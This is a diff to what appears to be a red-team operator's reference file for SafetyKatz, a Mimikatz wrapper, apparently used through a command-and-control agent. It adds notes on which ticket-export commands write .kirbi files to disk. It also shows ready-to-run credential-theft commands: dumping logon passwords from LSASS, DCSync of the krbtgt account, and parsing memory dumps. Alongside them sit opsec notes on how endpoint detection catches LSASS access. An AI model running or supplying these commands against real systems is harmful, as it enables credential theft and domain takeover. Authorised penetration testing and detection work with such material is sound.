@@ -41,7 +41,10 @@ opsec_notes: |
   3. The actual LSASS operations (handle acquisition, memory read) still generate
      the same kernel-level events as any Mimikatz execution
   Apollo's native `mimikatz` command likely uses a similar or better embedded approach —
-  prefer Apollo native. SafetyKatz is the standalone fallback.
+  prefer Apollo native. SafetyKatz is the standalone fallback. SafetyKatz does not change
+  Mimikatz's file-output behavior: `kerberos::list /export` and `sekurlsa::tickets /export`
+  write `.kirbi` files to the current working directory, and Mimikatz ticket forging without
+  `/ptt` writes `ticket.kirbi`.
 gotchas: |
   SafetyKatz is a DELIVERY mechanism for Mimikatz, not a bypass for the underlying
   LSASS access detection. Behavioral EDR (CrowdStrike, SentinelOne) catches the LSASS
@@ -59,7 +62,7 @@ common_args:
     description: Mimikatz commands to execute (space-separated, last must be 'exit')
     typical_values: ["'sekurlsa::logonpasswords' 'exit'",
                      "'privilege::debug' 'sekurlsa::logonpasswords' 'lsadump::dcsync /user:krbtgt' 'exit'"]
-last_updated: 2026-05-29
+last_updated: 2026-06-08
 ---
 
 # SafetyKatz
@@ -102,7 +105,9 @@ SafetyKatz passes commands directly to Mimikatz's parser:
 SafetyKatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
 SafetyKatz.exe 'lsadump::dcsync /domain:DOMAIN /user:krbtgt' 'exit'
 SafetyKatz.exe 'sekurlsa::minidump out.dmp' 'sekurlsa::logonpasswords' 'exit'
-SafetyKatz.exe 'kerberos::list /export' 'exit'
+SafetyKatz.exe 'kerberos::list' 'exit'
 ```
 
-All Mimikatz commands (see mimikatz.md) are available through SafetyKatz.
+Use `kerberos::list /export` or `sekurlsa::tickets /export` only when ticket files are
+the intended output; they write `.kirbi` files into the current directory. All Mimikatz
+commands (see mimikatz.md) are available through SafetyKatz.
